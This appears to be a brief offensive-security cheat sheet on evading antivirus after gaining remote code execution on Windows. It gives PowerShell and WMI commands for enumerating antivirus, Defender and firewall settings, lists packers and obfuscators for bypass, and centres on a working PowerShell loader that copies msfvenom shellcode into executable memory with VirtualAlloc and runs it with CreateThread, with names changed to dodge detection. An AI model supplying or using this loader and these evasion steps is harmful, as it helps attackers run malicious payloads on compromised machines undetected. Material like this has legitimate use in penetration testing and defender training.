

## Recon

Try checking for AV if you got RCE:

```powershell
PS C:\> wmic /namespace:\\root\securitycenter2 path antivirusproduct
PS C:\> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
PS C:\> Get-Service WinDefend
PS C:\> Get-NetFirewalLProfile
PS C:\> Get-EventLog -List
PS C:\> wmic product get name,version
```

### High level bypass methods

* packers
* obfuscators (incl. run in memory)
* encryption and in-memory decryption (most effective)
* Tooks: The Enigma Protector

## Thread injection

### Manual

* in-memory injection in powershell script

```powershell

# replacing some well known variable and function names

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

#shell code 
[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

```

* generate payload using msfvenom

```bash

msfvenom -p ... -f powershell -v sc

# past hex bytes into script

```

### Shellter

Paid program to automate the obfuscation process
